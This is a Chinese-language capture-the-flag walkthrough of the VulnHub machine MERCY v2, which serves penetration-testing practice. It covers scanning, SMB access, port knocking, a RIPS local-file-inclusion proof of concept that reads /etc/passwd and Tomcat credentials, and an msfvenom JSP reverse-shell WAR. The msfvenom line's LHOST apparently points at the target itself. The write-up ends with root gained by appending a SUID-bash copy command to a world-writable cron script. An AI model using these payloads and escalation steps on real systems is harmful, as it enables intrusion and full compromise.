## port scan

```shell
# Nmap 7.94SVN scan initiated Sun Feb  2 01:21:07 2025 as: nmap -sT --min-rate=8899 -p- -oN nmap_result/port 192.168.28.20
Nmap scan report for 192.168.28.20 (192.168.28.20)
Host is up (0.0026s latency).
Not shown: 65527 closed tcp ports (conn-refused)
PORT     STATE SERVICE
53/tcp   open  domain
110/tcp  open  pop3
139/tcp  open  netbios-ssn
143/tcp  open  imap
445/tcp  open  microsoft-ds
993/tcp  open  imaps
995/tcp  open  pop3s
8080/tcp open  http-proxy
```

```shell
# Nmap 7.94SVN scan initiated Sun Feb  2 01:21:47 2025 as: nmap -p53,110,139,143,445,993,995,8080 -sVC -O -oN nmap_result/detils 192.168.28.20
Nmap scan report for 192.168.28.20 (192.168.28.20)
Host is up (0.00063s latency).

PORT     STATE SERVICE     VERSION
53/tcp   open  domain      ISC BIND 9.9.5-3ubuntu0.17 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.17-Ubuntu
110/tcp  open  pop3
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
|_pop3-capabilities: SASL AUTH-RESP-CODE STLS RESP-CODES PIPELINING TOP CAPA UIDL
| fingerprint-strings: 
|   TerminalServer: 
|_    +OK Dovecot (Ubuntu) ready.
|_ssl-date: TLS randomness does not represent time
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp  open  imap        Dovecot imapd
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: more STARTTLS LOGINDISABLEDA0001 LOGIN-REFERRALS ENABLE capabilities listed ID IDLE post-login OK Pre-login IMAP4rev1 SASL-IR LITERAL+ have
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
993/tcp  open  ssl/imap    Dovecot imapd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
|_imap-capabilities: more capabilities ID ENABLE Pre-login listed AUTH=PLAINA0001 IDLE post-login OK IMAP4rev1 LOGIN-REFERRALS SASL-IR LITERAL+ have
995/tcp  open  ssl/pop3
|_pop3-capabilities: SASL(PLAIN) AUTH-RESP-CODE USER RESP-CODES PIPELINING TOP CAPA UIDL
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   SIPOptions: 
|_    +OK Dovecot (Ubuntu) ready.
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
| http-robots.txt: 1 disallowed entry 
|_/tryharder/tryharder
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-title: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-open-proxy: Proxy might be redirecting requests
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port110-TCP:V=7.94SVN%I=7%D=2/2%Time=679F0F6F%P=x86_64-pc-linux-gnu%r(T
SF:erminalServer,1D,"\+OK\x20Dovecot\x20\(Ubuntu\)\x20ready\.\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port995-TCP:V=7.94SVN%T=SSL%I=7%D=2/2%Time=679F0F6C%P=x86_64-pc-linux-g
SF:nu%r(SIPOptions,1D,"\+OK\x20Dovecot\x20\(Ubuntu\)\x20ready\.\r\n");
MAC Address: 00:0C:29:A0:C9:CA (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: MERCY; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: MERCY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: mercy
|   NetBIOS computer name: MERCY\x00
|   Domain name: \x00
|   FQDN: mercy
|_  System time: 2025-02-02T14:23:45+08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -2h40m00s, deviation: 4h37m07s, median: 0s
| smb2-time: 
|   date: 2025-02-02T06:23:45
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

存在smb,http,pop3服务

## enum

枚举smb服务

```
enum4linux -S 192.168.28.20
```

```shell
[+] Can't determine if host is part of domain or part of a workgroup


 =================================( Share Enumeration on 192.168.28.20 )=================================


        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        qiu             Disk      
        IPC$            IPC       IPC Service (MERCY server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            MERCY

[+] Attempting to map shares on 192.168.28.20

//192.168.28.20/print$  Mapping: DENIED Listing: N/A Writing: N/A
//192.168.28.20/qiu     Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:

NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
//192.168.28.20/IPC$    Mapping: N/A Listing: N/A Writing: N/A
enum4linux complete on Sun Feb  2 06:38:26 2025
```

## web 8080端口

`robots.txt`

http://192.168.28.20:8080/robots.txt

```
User-agent: *
Disallow: /tryharder/tryharder
```

访问`/tryharder/tryharder`,base64解码

```
SXQncyBhbm5veWluZywgYnV0IHdlIHJlcGVhdCB0aGlzIG92ZXIgYW5kIG92ZXIgYWdhaW46IGN5YmVyIGh5Z2llbmUgaXMgZXh0cmVtZWx5IGltcG9ydGFudC4gUGxlYXNlIHN0b3Agc2V0dGluZyBzaWxseSBwYXNzd29yZHMgdGhhdCB3aWxsIGdldCBjcmFja2VkIHdpdGggYW55IGRlY2VudCBwYXNzd29yZCBsaXN0LgoKT25jZSwgd2UgZm91bmQgdGhlIHBhc3N3b3JkICJwYXNzd29yZCIsIHF1aXRlIGxpdGVyYWxseSBzdGlja2luZyBvbiBhIHBvc3QtaXQgaW4gZnJvbnQgb2YgYW4gZW1wbG95ZWUncyBkZXNrISBBcyBzaWxseSBhcyBpdCBtYXkgYmUsIHRoZSBlbXBsb3llZSBwbGVhZGVkIGZvciBtZXJjeSB3aGVuIHdlIHRocmVhdGVuZWQgdG8gZmlyZSBoZXIuCgpObyBmbHVmZnkgYnVubmllcyBmb3IgdGhvc2Ugd2hvIHNldCBpbnNlY3VyZSBwYXNzd29yZHMgYW5kIGVuZGFuZ2VyIHRoZSBlbnRlcnByaXNlLg==
```

> It's annoying, but we repeat this over and over again: cyber hygiene is extremely important. Please stop setting silly passwords that will get cracked with any decent password list.
>
> Once, we found the password "password", quite literally sticking on a post-it in front of an employee's desk! As silly as it may be, the employee pleaded for mercy when we threatened to fire her.
>
> No fluffy bunnies for those who set insecure passwords and endanger the enterprise.

找到一个密码：`password`

然后就尝试爆破tomcat后台，无果

## smb

**尝试smb服务**

```shell
┌──(kali㉿kali)-[~/vulnhub/MERCY-v2]
└─$ smbclient -U qiu //192.168.28.20/qiu
Password for [WORKGROUP\qiu]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Aug 31 15:07:00 2018
  ..                                  D        0  Mon Nov 19 11:59:09 2018
  .bashrc                             H     3637  Sun Aug 26 09:19:34 2018
  .public                            DH        0  Sun Aug 26 10:23:24 2018
  .bash_history                       H      163  Fri Aug 31 15:11:34 2018
  .cache                             DH        0  Fri Aug 31 14:22:05 2018
  .private                           DH        0  Sun Aug 26 12:35:34 2018
  .bash_logout                        H      220  Sun Aug 26 09:19:34 2018
  .profile                            H      675  Sun Aug 26 09:19:34 2018

                19213004 blocks of size 1024. 16326108 blocks available
```

在`.private\opensesame`目录发现两个配置文件

```
smb: \.private\opensesame\> get config
smb: \.private\opensesame\> get configprint 
```

`configprint`一个sh脚本，有`knockd.conf`,`apache2.conf`,`smb.conf`配置文件

```shell
┌──(kali㉿kali)-[~/vulnhub/MERCY-v2]
└─$ cat configprint 
#!/bin/bash

echo "Here are settings for your perusal." > config
echo "" >> config
echo "Port Knocking Daemon Configuration" >> config
echo "" >> config
cat "/etc/knockd.conf" >> config
echo "" >> config
echo "Apache2 Configuration" >> config
echo "" >> config
cat "/etc/apache2/apache2.conf" >> config
echo "" >> config
echo "Samba Configuration" >> config
echo "" >> config
cat "/etc/samba/smb.conf" >> config
echo "" >> config
echo "For other details of MERCY, please contact your system administrator." >> config

chown qiu:qiu config
```

查看`config`文件

![image-20250202195232853](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250202195232853.png)

```shell
Port Knocking Daemon Configuration

[options]
        UseSyslog

[openHTTP]
        sequence    = 159,27391,4
        seq_timeout = 100
        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
        tcpflags    = syn

[closeHTTP]
        sequence    = 4,27391,159
        seq_timeout = 100
        command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
        tcpflags    = syn

[openSSH]
        sequence    = 17301,28504,9999
        seq_timeout = 100
        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
        tcpflags    = syn

[closeSSH]
        sequence    = 9999,28504,17301
        seq_timeout = 100
        command     = /sbin/iptables -D iNPUT -s %IP% -p tcp --dport 22 -j ACCEPT
        tcpflags    = syn
```

有个http和ssh服务

使用knock工具

```
knock 192.168.28.20 159 27391 4 -v
knock 192.168.28.20 17301 28504 9999 -v
```

![image-20250202195454748](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250202195454748.png)

然后扫描全端口

```shell
──(kali㉿kali)-[~/vulnhub/MERCY-v2]
└─$ nmap -sT --min-rate=8899 -p- 192.168.28.20 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-02 06:55 EST
Nmap scan report for 192.168.28.20 (192.168.28.20)
Host is up (0.0021s latency).
Not shown: 65525 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
110/tcp  open  pop3
139/tcp  open  netbios-ssn
143/tcp  open  imap
445/tcp  open  microsoft-ds
993/tcp  open  imaps
995/tcp  open  pop3s
8080/tcp open  http-proxy
```

发现开启了ssh和http服务

## web 80

```shell
┌──(kali㉿kali)-[~/vulnhub/MERCY-v2]
└─$ dirb http://192.168.28.20
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Feb  2 06:58:18 2025
URL_BASE: http://192.168.28.20/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.28.20/ ----
+ http://192.168.28.20/index.html (CODE:200|SIZE:90)
+ http://192.168.28.20/robots.txt (CODE:200|SIZE:50)
+ http://192.168.28.20/server-status (CODE:403|SIZE:293)
+ http://192.168.28.20/time (CODE:200|SIZE:79)
```

```shell
┌──(kali㉿kali)-[~/vulnhub/MERCY-v2]
└─$ curl http://192.168.28.20/time      
The system time is: Sun Feb  2 20:00:01 +08 2025.
Time check courtesy of LINUX
```

展示出了当前的时间，还会更新（可能存在定时任务）

![image-20250202200214592](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250202200214592.png)

**rips 0.53**

存在本地文件包含漏洞

```
searchsploit RIPS -m 18660
```

```shell
File: /windows/code.php
=======================

102: file $lines = file($file);
    96: $file = $_GET['file'];

PoC:
http://localhost/rips/windows/code.php?file=../../../../../../etc/passwd

File: /windows/function.php
===========================

    64: file $lines = file($file);
        58: $file = $_GET['file'];

PoC:
http://localhost/rips/windows/function.php?file=../../../../../../etc/passwd(will
read the first line of the file)
```

> http://192.168.28.20/nomercy/windows/code.php?file=../../../../../../etc/passwd

![image-20250202200440664](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250202200440664.png)

尝试包含`/var/log/mail.log`,`/var/log/apache2/access.log`，无果（应该是权限问题）

尝试包含`/etc/tomcat7/tomcat-users.xml`

![image-20250202201140105](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250202201140105.png)

```
<role rolename="admin-gui"/>
<role rolename="manager-gui"/>
<user username="thisisasuperduperlonguser" password="heartbreakisinevitable" roles="admin-gui,manager-gui"/> 
<user username="fluffy" password="freakishfluffybunny" roles="none"/>
</tomcat-users> 
```

两对凭据

```
thisisasuperduperlonguser:heartbreakisinevitable
fluffy:freakishfluffybunny
```

登录后，war包部署即可

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.28.20 LPORT=1234 -f war > shell.war
```

> http://192.168.28.20:8080/shell/

反弹shell

## 提权

切换`fluffy`用户，`/home/fluffy/.private/secrets`目录发现`timeclock`脚本

```shell
$ ls -la
ls -la
total 20
drwxr-xr-x 2 fluffy fluffy 4096 Nov 20  2018 .
drwxr-xr-x 3 fluffy fluffy 4096 Nov 20  2018 ..
-rwxr-xr-x 1 fluffy fluffy   37 Nov 20  2018 backup.save
-rw-r--r-- 1 fluffy fluffy   12 Nov 20  2018 .secrets
-rwxrwxrwx 1 root   root    264 Feb  2 15:51 timeclock
$ cat timeclock
cat timeclock
#!/bin/bash

now=$(date)
echo "The system time is: $now." > ../../../../../var/www/html/time
echo "Time check courtesy of LINUX" >> ../../../../../var/www/html/time
chown www-data:www-data ../../../../../var/www/html/time
```

```
echo "cp /bin/bash /tmp/bash;chmod +s /tmp/bash" >> timeclock
```

```shell
$ cd /tmp
$ ls
bash  hsperfdata_tomcat7  tomcat7-tomcat7-tmp
$ ./bash -p
bash-4.3# whoami
root
```

```shell
bash-4.3# cat proof.txt
Congratulations on rooting MERCY. :-)
```